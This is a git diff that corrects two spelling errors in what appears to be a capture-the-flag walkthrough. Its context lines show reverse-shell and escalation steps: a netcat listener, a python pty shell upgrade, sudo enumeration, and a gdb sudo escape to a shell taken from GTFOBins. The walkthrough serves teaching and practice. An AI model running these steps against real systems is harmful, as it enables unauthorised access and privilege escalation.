@@ -68,7 +68,7 @@ Once you find the reverse shell set up a listener
 nc -lnvp {the port in the rev shell file}
 ```
 
-and then make the shell stabile
+and then make the shell stable
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -82,7 +82,7 @@ Ok now we are in, let's check if there's a SUID to escalate
 sudo -l
 ```
 
-You can see that gdb is runnable wothout password, use GTFOBins (grat site!) to escalate.
+You can see that gdb is runnable wothout password, use GTFOBins (great site!) to escalate.
 
 ```
 sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
